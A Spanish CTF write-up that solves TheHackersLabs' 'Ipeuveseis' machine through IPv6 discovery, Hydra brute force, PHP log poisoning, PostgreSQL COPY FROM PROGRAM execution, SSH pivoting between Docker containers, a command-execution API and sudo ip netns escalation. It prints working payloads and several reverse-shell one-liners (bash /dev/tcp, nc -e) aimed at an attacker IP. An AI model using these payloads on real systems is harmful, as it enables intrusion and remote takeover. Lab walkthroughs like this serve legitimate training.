---
author: Lenam  
pubDatetime: 2026-02-01T00:00:00Z  
title: WriteUp Ipeuveseis - TheHackersLabs  
urlSlug: ipeuveseis-writeup-thehackerslabs  
featured: true
draft: false  
ogImage: "../../../assets/images/ipeuveseis/OpenGraph.png"  
tags:
  - writeup
  - TheHackersLabs
  - IPv6
  - PostgreSQL
  - log poisoning
  - Docker
description:  
  Writeup del reto "Ipeuveseis" de The Hackers Labs, enfocado en atacar servicios IPv6, salto de contenedores y escalada de privilegios. Perfecto para practicar técnicas de pentesting en entornos con contenedores e IPv6.
lang: es
translationId: ipeuveseis-writeup-thehackerslabs
---

A continuación se detalla una manera de resolver el CTF de la máquina Ipeuveseis de The Hackers Labs. Este reto puede abordarse de distintas formas; aquí encontrarás una de ellas, aunque también es recomendable consultar otros writeups de la comunidad para contrastar enfoques y seguir aprendiendo.

## Tabla de contenido

## Enumeración

A diferencia de otras máquinas de la misma plataforma, en esta ocasión no se muestra la dirección IP de la máquina objetivo, por lo que debemos encontrarla por nuestros propios medios.

![](../../../assets/images/ipeuveseis/20260121_012845_image.png)

La red de la máquina virtual está configurada en modo adaptador puente, para identificar la IP de la máquina, empleamos arp-scan. Como estamos usando VirtualBox, sabemos que las direcciones MAC de sus tarjetas de red suelen comenzar por `08:00:27`.

```
$ sudo arp-scan --localnet | grep 08:00:27
192.168.1.122   08:00:27:ca:f1:cb       (Unknown)
```

- `sudo arp-scan --localnet` envía paquetes ARP a todos los dispositivos de la red local para descubrir cuáles están activos y obtener sus direcciones IP y MAC.
- El uso de `grep 08:00:27` filtra la salida mostrando solo aquellas líneas donde la MAC comienza por ese identificador característico.

El resultado muestra que se encontró un dispositivo con IP `192.168.1.122` y dirección MAC `08:00:27:ca:f1:cb`, que presumiblemente corresponde a nuestra máquina objetivo.

Aunque hemos logrado identificar la dirección IP de la máquina objetivo, al efectuar un escaneo de puertos no se observa ninguno abierto.

```bash
$ nmap -p- 192.168.1.122
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-21 01:38 CET
Nmap scan report for 192.168.1.122
Host is up (0.000095s latency).
All 65535 scanned ports on 192.168.1.122 are in ignored states.
Not shown: 65535 closed tcp ports (conn-refused)

Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
```

Al analizar el nombre de la máquina, `ipeuveseis`, notamos que corresponde a la pronunciación de `IPv6` en español. Esto nos lleva a pensar que la máquina podría estar configurada para exponer sus servicios únicamente a través de IPv6, por lo que procedemos a buscar la dirección IPv6 del objetivo.

En este punto conviene aclarar por qué no se puede hacer un escaneo tradicional de todo el rango, como suele hacerse en IPv4. En IPv4, una red típica /24 tiene 256 direcciones posibles, lo que hace factible enviar un ping o un escaneo a todo el rango. Sin embargo, en IPv6 los rangos suelen ser /64, lo que implica 2^64 direcciones posibles:

2⁶⁴ = **18.446.744.073.709.551.616 direcciones**

Escanear todas las direcciones de un /64 en IPv6 es imposible por la cantidad inmensa de posibles IPs, así que no funcionan los barridos típicos de IPv4. Por eso hay que usar técnicas como la multidifusión para descubrir dispositivos.

Para identificar dispositivos activos con IPv6 en la red local cuando no conocemos sus direcciones, podemos hacer un ping multicast a todos los nodos; además, si sabemos la MAC de la máquina objetivo, podemos calcular directamente su IPv6 link-local aplicando el formato EUI-64 (prefijo `fe80::/64`), deduciéndola sin esperar respuesta al ping.

Para realizar el ping, empleamos el siguiente comando:

```bash
ping6 -c 2 "ff02::1%eth0"
```

![Respuesta ping6](../../../assets/images/ipeuveseis/20260121_021022_image.png)

Este comando envía dos paquetes ICMPv6 (por la opción `-c 2`) a la dirección de multidifusión link-local `ff02::1` a través de la interfaz de red especificada (`eth0`). Esta dirección corresponde a "todos los nodos" conectados en la red local, por lo que cualquier dispositivo con IPv6 responderá. Es una técnica muy útil para enumerar hosts activos en redes IPv6.

Sin embargo, ten en cuenta que **las respuestas a este tipo de ping mostrarán normalmente solo las direcciones IPv6 link-local** (`fe80::/64`) de los dispositivos, ya que esas son las únicas que necesariamente tiene cada interfaz y son válidas únicamente dentro del segmento de red local.

No es habitual que el comando `ping6` muestre directamente direcciones ULA (`fd00::/8`) o globales en las respuestas, incluso si existen y están configuradas en los hosts. Para descubrir si un dispositivo tiene direcciones globales o ULA asignadas, normalmente debemos usar herramientas adicionales, como nmap con opciones IPv6.

Cada host puede responder mostrando una o varias de sus direcciones IPv6, pero habitualmente solo verás la link-local salvo que el sistema esté configurado específicamente para responder usando otra.

Ahora ya podemos realizar un escaneao de nmap con la dirección local encontrada.

```bash
nmap -p- -sVC -6 fe80::a00:27ff:feca:f1cb%eth0
```

![nmap a ipv6 local](../../../assets/images/ipeuveseis/20260121_021317_image.png)

El resultado del escaneo de nmap revela información importante sobre los servicios expuestos en la máquina objetivo:

- **Puerto 22/tcp (SSH)**: Está abierto y ejecutando OpenSSH versión 10.0p2 en Debian 7. Este servicio utiliza el protocolo 2.0 de SSH.
- **Puerto 8080/tcp (HTTP)**: Está abierto y ejecutando un servidor web Apache httpd versión 2.4.66 en Debian.
- **Sistema Operativo**: Se identifica como Linux (Debian).
- **Dirección MAC**: `08:00:27:CA:F1:CB`, que corresponde a una NIC virtual de Oracle VirtualBox, confirmando que se trata de una máquina virtual.

El script `address-info` de nmap también confirma que la dirección MAC corresponde a un adaptador de red virtual de VirtualBox.

Es importante destacar que este escaneo se realizó utilizando la dirección IPv6 link-local (`fe80::a00:27ff:feca:f1cb`), que solo es válida dentro del segmento de red local. Para acceder a servicios web desde un navegador o realizar conexiones más estables, necesitaremos obtener una dirección IPv6 global o ULA (Unique Local Address) del objetivo.

Para conseguir la IPv6 podemos utilizar el script `targets-ipv6-multicast-echo` de nmap.

```bash
sudo nmap -6 -sL --script targets-ipv6-multicast-echo --script-args 'newtargets,interface=eth0'
```

![Resultado nmap targets-ipv6-multicast-echo](../../../assets/images/ipeuveseis/20260121_022343_image.png)

Aunque no es imprescindible, resulta más cómodo trabajar si conseguimos una dirección IPv6 global (normalmente comienza por `2XXX:`). En la captura anterior, la dirección real de IPv6 se ha ocultado por privacidad.

**Debes anotar la dirección IPv6 que coincida con la dirección MAC obtenida anteriormente** (`08:00:27:CA:F1:CB` en nuestro caso). Esa será la dirección IPv6 global de la máquina víctima que utilizaremos para acceder a los servicios web y realizar las siguientes fases del ataque.

Para los ejemplos siguientes de este writeup, utilizaremos la dirección IPv6 global de ejemplo `2001:db8::1` (el prefijo `2001:db8::/32` está reservado para documentación y ejemplos según RFC 3849).

Ahora podemos abrir el navegador en el puerto 8080 encontrado con la IPv6 obtenida. Como las direcciones IPv6 contienen dos puntos, es necesario escribir la URL con el siguiente formato:

```text
http://[2001:db8::1]:8080/
```

Reemplaza `2001:db8::1` por la dirección IPv6 global que obtuviste previamente.

![](../../../assets/images/ipeuveseis/20260121_023149_image.png)

## Vulneración

En la web encontrada en el puerto 8080 se muestra un **formulario de validación de usuarios**. Nos inventamos un dominio y lo añadimos al fichero hosts para no tener que introducir la IP continuamente (reemplaza `2001:db8::1` por la dirección IPv6 global que obtuviste).

```bash
echo "2001:db8::1 ipv6.thl" | sudo tee -a /etc/hosts
```

Ahora también podemos acceder a la URL [`http://ipv6.thl:8080`](http://ipv6.thl:8080).

### Fuerza bruta de credenciales

Intentamos realizar un ataque de fuerza bruta con Hydra utilizando los nombres de usuario del diccionario `.../metasploit/http_default_users.txt` y las contraseñas más comunes de `.../seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`.

```bash
hydra -6 -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -s 8080 -f ipv6.thl http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"
```

![Resultado de fuerza bruta de credenciales con Hydra](../../../assets/images/ipeuveseis/20260121_025213_image.png)

El ataque de fuerza bruta reveló las credenciales `admin:admin123`, que permiten acceder fácilmente al panel y ver las secciones `logs.php` y `about.php`. Es una combinación tan obvia que podría adivinarse sin herramientas.

### Log Poisoning para RCE

![Página logs.php](../../../assets/images/ipeuveseis/20260121_030509_image.png)

En el fichero `logs.php` podemos visualizar los registros del servicio web, por lo que podemos intentar un log poisoning sin necesidad de encontrar un LFI.

1. **Obtener cookie de sesión después del login:**

```bash
# Hacer login y guardar la cookie en un archivo
curl -6 -c cookies.txt -X POST -d "username=admin&password=admin123" http://ipv6.thl:8080/index.php

# Verificar que la cookie se guardó correctamente
cat cookies.txt
```

2. **Inyectar código PHP en el User-Agent:**

```bash
# Este curl funciona sin cookie porque index.php no requiere autenticación para recibir peticiones
curl -6 -A "<?php system(\$_GET['cmd']); ?>" http://ipv6.thl:8080/
```

3. **Ejecutar comandos usando la cookie de sesión:**

```bash
# Acceder a logs.php con la cookie de sesión para ejecutar comandos
curl -6 -b cookies.txt "http://ipv6.thl:8080/logs.php?log=access&cmd=id"
```

4. **Obtener reverse shell:**

```bash
# Escuchar en tu máquina atacante.
nc -lvnp 4444

# Ejecuta la reverse shell accediendo a logs.php con la cookie. Recuerda sustituir la IP (192.168.1.123) de la reverse shell por la de tu máquina atacante.
curl -6 -b cookies.txt "http://ipv6.thl:8080/logs.php?log=access&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.123%2F4444%200%3E%261%22%20%26"
```

Obtenemos una shell con el usuario www-data.

![Reverse shell www-data](../../../assets/images/ipeuveseis/20260121_030224_image.png)

## Movimiento lateral

Es recomendable asegurarse de contar con una TTY completa para trabajar cómodamente con la shell. Esto puede lograrse manualmente o bien empleando herramientas como `rlwrap`, `penelope`, o una propia, como en mi caso, mediante [shell_automation_tool](https://github.com/Len4m/shell_automation_tool).

### Del contenedor web al contenedor de la base de datos

Una vez estabilizada la sesión, procedemos a explorar los archivos del sitio web y las variables de entorno, lo que nos permite buscar credenciales, configuraciones sensibles y posibles vectores para escalar privilegios o moverse lateralmente dentro del sistema.

El fichero de configuración de la base de datos del sitio web:

```bash
www-data@ctf:/var/www/html$ head -n 30 ../config/database.php
<?php
/**
 * Database Configuration
 * 
 * WARNING: This file contains sensitive credentials
 * TODO: Move to environment variables (NEVER commit this!)
 * 
 * ===========================================
 * INTERNAL USE ONLY - Database Credentials
 * ===========================================
 * 
 * Application User:
 *   Host: fd00:1337:1::20
 *   Port: 5432
 *   Database: database
 *   User: user
 *   Pass: jec41Ew98zB4ch3nM0vP
 * 
 * Super Admin (for maintenance only):
 *   User: superadmin
 *   Pass: jHt9b8u5whZ55551zlY1
 */

// Application database credentials
define('DB_HOST', getenv('DB_HOST') ?: 'fd00:1337:1::20');
define('DB_PORT', getenv('DB_PORT') ?: '5432');
define('DB_NAME', getenv('DB_NAME') ?: 'database');
define('DB_USER', getenv('DB_USER') ?: 'user');
define('DB_PASS', getenv('DB_PASS') ?: 'jec41Ew98zB4ch3nM0vP');

```

Las variables de entorno.

```bash
www-data@ctf:/var/www/html$ printenv | grep DB
DB_PORT=5432
DB_USER=user
DB_HOST=fd00:1337:1::20
DB_NAME=database
DB_PASS=jec41Ew98zB4ch3nM0vP

```

Credenciales obtenidas:

- `user` / `jec41Ew98zB4ch3nM0vP`
- `superadmin` / `jHt9b8u5whZ55551zlY1`

Observando la programación del sitio web y el puerto de conexión de la base de datos, podemos deducir que estas credenciales permiten conectarse a un servidor PostgreSQL en la dirección IPv6 `fd00:1337:1::20` usando el puerto `5432`.

```bash
www-data@ctf:/var/www/html$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 8e:39:3a:1d:8b:4a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fd00:1337:1::10/64 scope global nodad 
       valid_lft forever preferred_lft forever
    inet6 fe80::8c39:3aff:fe1d:8b4a/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
3: eth1@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether d2:f1:ef:39:09:c8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fd00:dead:beef::20/64 scope global nodad 
       valid_lft forever preferred_lft forever
    inet6 fe80::d0f1:efff:fe39:9c8/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
```

El comando `ip a` revela que el contenedor dispone de dos interfaces de red principales, cada una con una dirección IPv6 global ULA:

- **eth0:** `fd00:1337:1::10/64`
- **eth1:** `fd00:dead:beef::20/64`

Esto indica que el contenedor está conectado simultáneamente a dos redes: `fd00:1337:1::/64`, que permite el acceso a PostgreSQL utilizando las credenciales obtenidas, y `fd00:dead:beef::/64`, lo que podría facilitar la comunicación con otros servicios o contenedores presentes en esa subred.

Podemos conectar a la BD de PostgreSQL con las credenciales del usuario `superadmin` obtenidas desde el contenedor del sitio web.

```bash
www-data@ctf:/var/www/html$ psql -h fd00:1337:1::20 -U superadmin database
Password for user superadmin: 
psql (17.7 (Debian 17.7-0+deb13u1), server 15.15)
Type "help" for help.

database=# 
```

### Del contenedor de la base de datos al contenedor de Backups

Verificamos que el usuario es superusuario/administrador de la base de datos usando el comando `\du`, lo cual nos otorga permisos elevados en PostgreSQL.

```sql
database-# \d
                  List of relations
 Schema |        Name        |   Type   |   Owner  
--------+--------------------+----------+------------
 public | backup_logs        | table    | superadmin
 public | backup_logs_id_seq | sequence | superadmin
 public | users              | table    | superadmin
 public | users_id_seq       | sequence | superadmin
(4 rows)

database-# \du
                              List of roles
 Role name  |                         Attributes             
------------+------------------------------------------------------------
 superadmin | Superuser, Create role, Create DB, Replication, Bypass RLS
 user       | 
```

Con el atributo de `Superuser`, puedes ejecutar comandos del sistema usando los siguientes payloads.

```sql
-- Ejecutar comando id
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'id';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

Observamos que somos el usuario postgres.

```sql
-- Redes e IPs del contenedor de la base de datos
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'ip a';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

El resultado del comando `ip a` muestra que el contenedor tiene dos interfaces relevantes, ambas con direcciones IPv6 globales ULA asignadas:

- **eth0:** `fd00:1337:2::20/64`
- **eth1:** `fd00:1337:1::20/64`

Ambas interfaces presentan además direcciones link-local (`fe80::...`). Las redes `fd00:1337:2::/64` y `fd00:1337:1::/64` corresponden a dos redes internas distintas, cada una asociada a una interfaz diferente: la primera es nueva, mientras que la segunda coincide con la del contenedor web. Es probable que ambas hayan sido configuradas por Docker. Estas direcciones ULA permiten la comunicación interna entre servicios y contenedores conectados a las mismas redes, lo que facilita posibles movimientos laterales en el entorno.

```sql
-- Claves SSH filtradas del usuario backupuser
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'ls -la /home/postgres/.ssh/ && cat /home/postgres/.ssh/*';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

![Filtración de IP, usuario y claves SSH](../../../assets/images/ipeuveseis/20260131_192628_image.png)

Al continuar investigando, encontramos una clave SSH, el nombre de usuario `backupuser` y la dirección IPv6 `fd00:1337:2::30`, la cual pertenece a la red previamente identificada `fd00:1337:2::/64`.

Para entender mejor el alcance de la conectividad entre los distintos contenedores y nuestra máquina atacante, es recomendable realizar pruebas de red. Si intentamos hacer ping a nuestra máquina desde el contenedor de la base de datos, veremos que no obtenemos respuesta: este contenedor no posee salida directa hacia el exterior y, por tanto, solo es posible interactuar desde otros contenedores, como el web.

Para comprobarlo, primero podemos monitorear el tráfico ICMPv6 en nuestra máquina usando:

```bash
sudo tcpdump -n -i any icmp6
```

Luego, lanzamos un ping desde el contenedor web, recordando que debes modificar la IP `2001:db8::10` por la correspondiente a tu máquina atacante:

```bash
ping -6 -c 1 2001:db8::10
```

Alternativamente, podemos ejecutar un comando equivalente desde la base de datos PostgreSQL utilizando PSQL:

```sql
-- El contenedor de la base de datos no dispone de conectividad hacia el exterior.
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'ping -6 -c 1 2001:db8::10';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

Así, queda demostrado que solo el contenedor web puede comunicarse de forma directa con nuestra máquina atacante, mientras que el contenedor de la base de datos carece de esa posibilidad de salida.

También es posible profundizar en la investigación realizando un escaneo de puertos sobre la IP del gateway de las redes a las que tenemos acceso desde el host. Sin embargo, al efectuar una búsqueda por fuerza bruta, únicamente se detecta el puerto 22 abierto, al cual no disponemos de acceso permitido.

Intentamos acceder al contenedor de backup (`fd00:1337:2::30`) mediante SSH desde el contenedor de la base de datos, utilizando el usuario y la clave previamente obtenidos, y ejecutando el comando `ip a` para consultar la configuración de red de dicho contenedor.

```sql
-- Redes e IPs del contenedor de la base de datos
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "ip a"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

![Configuración IP contenedor backups](../../../assets/images/ipeuveseis/20260201_205311_image.png)

Podemos observar que el contenedor de backups está conectado a dos redes diferentes: la red `fd00:dead:beef::/64` (asociada a la interfaz `eth0`) y la red `fd00:1337:2::/64` (asociada a la interfaz `eth1`).

En resumen, los diferentes contenedores están conectados a tres redes internas distintas dentro del stack Docker, cuyas direcciones se detallan a continuación.

![Configuración IP contenedor backups](../../../assets/images/ipeuveseis/docker-lan.png)

Hemos comprobado que, aunque el contenedor web tiene conectividad hacia el exterior, el contenedor de la base de datos PostgreSQL no dispone de ella. Sin embargo, el contenedor de backup sí puede comunicarse con el exterior, ya que tiene un dispositivo de red en la misma red `fd00:dead:beef::/64` que el contenedor web.

Para confirmar la conectividad desde el contenedor de backups hacia nuestra máquina atacante, podemos emplear SSH y ejecutar un comando de ping de la siguiente manera.

Primero, en la máquina atacante, captura los paquetes ICMPv6 para observar el tráfico entrante:

```bash
sudo tcpdump -n -i any icmp6
```

Luego, desde la base de datos, establecemos una conexión SSH al contenedor de backup y realizamos un ping a la dirección IPv6 de nuestra máquina atacante (recuerda reemplazar `2001:db8::10` por la IP correspondiente):

```sql
-- Verificación de conectividad desde el contenedor de backup
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "ping -6 -c 1 2001:db8::10"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

De este modo, comprobamos que el contenedor de backup puede establecer comunicación directa con nuestra máquina atacante, utilizando la red a la que también tiene acceso el contenedor web.

Ahora que hemos verificado la conectividad entre el contenedor de backups y nuestra máquina atacante mediante IPv6, podemos preparar un listener para recibir la shell reversa.

En nuestra máquina atacante, iniciamos la escucha en el puerto 443 usando Netcat con soporte IPv6:

```bash
nc -6 -lvnp 443
```

A continuación, desde la base de datos, aprovechando la conexión SSH al contenedor de backups, ejecutamos el siguiente payload para obtener una reverse shell (recuerda sustituir `2001:db8::10` por la dirección IPv6 global de tu máquina):

```sql
-- Reverse shell desde el contenedor de backup hacia la máquina atacante
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "nc 2001:db8::10 443 -e sh"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

o

```sql
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "bash -i >& /dev/tcp/2001:db8::10/443 0>&1"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

De esta forma, al ejecutarse correctamente el comando anterior, obtendrás una shell interactiva en el contenedor de backups directamente en tu máquina atacante.

![shell en contenedor backup](../../../assets/images/ipeuveseis/20260201_232709_image.png)

> Nota: Estos pasos pueden llevarse a cabo de diferentes maneras; por ejemplo, también podrías emplear herramientas como chisel, socat, proxychains u otras técnicas alternativas según tus preferencias o el entorno disponible.

## Escapando del contenedor Docker

Desde el contenedor de backup, es recomendable realizar un escaneo de los puertos accesibles en el gateway de la red interna (`fd00:dead:beef::1`). Esto nos permite identificar servicios expuestos únicamente a la red a la que pertenecen los contenedores internos.

```bash
export ip=fd00:dead:beef::1
for port in $(seq 1 65535); do
  timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open" 2>/dev/null
done
```

Durante el reconocimiento, además del puerto 8080 (que corresponde al acceso al contenedor web), detectamos el puerto 8081 expuesto en el gateway. Llama la atención que este puerto es visible desde el contenedor de backups, pero no se encuentra accesible desde el contenedor web, a pesar de compartir la misma red interna. Esto sugiere que existe algún tipo de restricción, a nivel de firewall o configuración de red, que únicamente permite al contenedor de backup comunicarse con ese servicio concreto en el host.

![Escaner puertos](../../../assets/images/ipeuveseis/20260202_000607_image.png)

Vamos a investigar qué servicio se encuentra activo en el puerto 8081 del gateway interno. Para ello, realizamos una petición HTTP con curl:

```bash
curl -o- http://[fd00:dead:beef::1]:8081
```

La respuesta es un objeto JSON que nos describe el funcionamiento de una API orientada a un reto CTF usando direcciones IPv6. El servicio nos plantea un desafío que consiste en convertir una lista de direcciones MAC al formato de dirección IPv6 usando EUI-64, y luego validarlas con una petición POST.

```json
{
  "message": "IPv6 CTF API",
  "challenge": {
    "description": "Convert the following MAC addresses to IPv6 using EUI-64 format",
    "mac_addresses": [
      "00:11:22:33:44:55",
      "AA:BB:CC:DD:EE:FF",
      "12:34:56:78:9A:BC",
      "DE:AD:BE:EF:CA:FE",
      "01:23:45:67:89:AB"
    ],
    "total_macs": 5,
    "instructions": {
      "step1": "Convert each MAC address to IPv6 using EUI-64 format. Use the standard IPv6 link-local prefix",
      "step2": "Send a POST request to /validate with the following JSON structure:",
      "request_structure": {
        "mac_addresses": "Array of all MAC addresses from the challenge (in the same order)",
        "ipv6_addresses": "Array of corresponding IPv6 addresses (one for each MAC, in the same order)"
      },
      "example_request": {
        "mac_addresses": [
          "11:22:33:44:55:66",
          "FF:EE:DD:CC:BB:AA"
        ],
        "ipv6_addresses": [
          "fe80::1322:33ff:fe44:5566",
          "fe80::ffee:ddff:fecc:bbaa"
        ]
      },
      "requirements": [
        "You must send ALL MAC addresses from the challenge list above",
        "You must send the same number of IPv6 addresses as MAC addresses",
        "The order of MAC addresses and IPv6 addresses must match",
        "All conversions must be correct to proceed",
        "Use Content-Type: application/json header"
      ]
    }
  },
  "endpoints": {
    "/validate": {
      "method": "POST",
      "description": "Validate MAC addresses and convert to IPv6 (must validate ALL MACs)",
      "required_parameters": {
        "mac_addresses": "Array of MAC addresses (all from challenge)",
        "ipv6_addresses": "Array of corresponding IPv6 addresses in EUI-64 format"
      },
      "example": {
        "mac_addresses": [
          "11:22:33:44:55:66"
        ],
        "ipv6_addresses": [
          "fe80::1322:33ff:fe44:5566"
        ]
      }
    },
    "/execute": {
      "method": "POST",
      "description": "Execute command (requires ALL MACs to be validated first)",
      "required_parameters": {
        "command": "Command to execute"
      }
    },
    "/status": {
      "method": "GET",
      "description": "Check validation status"
    }
  }
```

La estructura principal del reto es la siguiente:

- **endpoints:** Endpoints disponibles:
  - `/validate` (POST): Valida el reto enviando las direcciones.
  - `/execute` (POST): Permite ejecutar comandos (solo tras superar la validación previa).
  - `/status` (GET): Consulta el estado de validación.

A continuación se listan las direcciones MAC que debes transformar a direcciones IPv6 empleando el formato EUI-64.

```json
{
   "mac_addresses": [
      "00:11:22:33:44:55",
      "AA:BB:CC:DD:EE:FF",
      "12:34:56:78:9A:BC",
      "DE:AD:BE:EF:CA:FE",
      "01:23:45:67:89:AB"
   ],
}
```

Puedes revisar el apartado de `instructions` en el JSON si quieres ver los pasos exactos, pero aquí te explico el proceso manualmente para que se entienda y aprendamos más.

Supongamos que tenemos la MAC **00:11:22:33:44:55**.

- **Paso 1: Insertar `FF:FE` en medio (formato EUI-64).**
  Tomamos los primeros tres bytes y los últimos tres, y entre medio colocamos `FF:FE`:

  > **00:11:22:FF:FE:33:44:55**
  >
- **Paso 2: Cambiar el bit U/L del primer byte.**
  Esto se logra haciendo un XOR con 02 al primer byte.

  Primer byte original: `00`

  `00 XOR 02 = 02`

  El resultado ahora es:

  > **02:11:22:FF:FE:33:44:55**
  >
- **Paso 3: Convertir a formato IPv6 agrupando en bloques de 4 dígitos hex.**
  Agrupamos los bytes resultantes:

  > **0211:22FF:FE33:4455**
  >
- **Paso 4: Agregar el prefijo link-local estándar (`FE80::/64`).**
  El resultado final de la conversión es:

  > **FE80::0211:22FF:FE33:4455**
  >

> **Ojo:** Puedes usar ChatGPT, un script o hacerlo a mano, pero lo importante es entender el proceso y no solo copiar la respuesta.

A continuación, la solución al endpoint validate.

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/validate" \
  -H "Content-Type: application/json" \
  -d "{\"mac_addresses\":[\"00:11:22:33:44:55\",\"AA:BB:CC:DD:EE:FF\",\"12:34:56:78:9A:BC\",\"DE:AD:BE:EF:CA:FE\",\"01:23:45:67:89:AB\"],\"ipv6_addresses\":[\"fe80::211:22ff:fe33:4455\",\"fe80::a8bb:ccff:fedd:eeff\",\"fe80::1034:56ff:fe78:9abc\",\"fe80::dcad:beff:feef:cafe\",\"fe80::323:45ff:fe67:89ab\"]}"
```

```bash
# Más legible
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/validate" \
  -H "Content-Type: application/json" \
  -d @- <<'JSON'
{
  "mac_addresses": [
    "00:11:22:33:44:55",
    "AA:BB:CC:DD:EE:FF",
    "12:34:56:78:9A:BC",
    "DE:AD:BE:EF:CA:FE",
    "01:23:45:67:89:AB"
  ],
  "ipv6_addresses": [
    "fe80::211:22ff:fe33:4455",
    "fe80::a8bb:ccff:fedd:eeff",
    "fe80::1034:56ff:fe78:9abc",
    "fe80::dcad:beff:feef:cafe",
    "fe80::323:45ff:fe67:89ab"
  ]
}
JSON
```

Asumiendo que la validación ya fue aceptada, conseguimos ejecución de comandos en el host con el usuario `lenam`.

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/execute" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"id\"}"
```

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/execute" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"cat /etc/passwd\"}"
```

Para obtener una shell inversa fuera del contenedor, primero iniciamos un listener en nuestra máquina atacante con netcat:

```bash
nc -lvnp 5555
```

Luego, desde la shell del contenedor de backups, lanzamos la reverse shell hacia nuestra máquina (recuerda sustituir la IP `192.168.1.123` por la correspondiente a tu equipo atacante):

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/execute" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"nc 192.168.1.123 5555 -e /bin/bash\"}"
```

Al conectar, logramos salir del contenedor y obtener acceso a la máquina host.

![](../../../assets/images/ipeuveseis/20260202_003358_image.png)

A continuación, podemos leer la flag de usuario ejecutando:

```bash
cat user.txt
```

## Escalada a root

Para mejorar la experiencia con la shell, es recomendable habilitar un TTY interactivo o bien copiar nuestra clave SSH al sistema comprometido, logrando así persistencia y un entorno más funcional.

El siguiente paso es comprobar qué privilegios tenemos con `sudo`, ejecutando:

```bash
sudo -l
```

![sudo lenam user](../../../assets/images/ipeuveseis/20260104_225105_image.png)

Observamos que el usuario `lenam` puede ejecutar el comando `ip` como root sin necesidad de introducir una contraseña. También aparecen dos scripts (`block-web-host-access.sh` y `remove-web-host-block.sh`) en la lista de comandos permitidos, aunque no disponemos de acceso de lectura a los mismos. Por sus nombres, todo apunta a que se emplean para gestionar el acceso al host web.

Para escalar privilegios a root, aprovechamos los permisos sobre el binario `ip`, siguiendo la técnica descrita en GTFOBins. Los comandos necesarios son:

```bash
sudo ip netns add mynetns
sudo ip netns exec mynetns /bin/bash
```

Tras ejecutar estos pasos, obtendremos una shell con privilegios de root. Ahora solo queda leer la flag del usuario root:

```bash
cat /root/root.txt
```

![root flag](../../../assets/images/ipeuveseis/20260104_225326_image.png)

> **Nota final:**  
¡Gracias por leer este writeup! Espero que este recorrido te haya resultado útil y que hayas aprendido algo nuevo sobre IPv6, su formato EUI-64 o técnicas de explotación en escenarios reales.  
Para más información, puedes consultar la [documentación de IPv6 (RFC 4291)](https://datatracker.ietf.org/doc/html/rfc4291).  
¡Hasta la próxima!


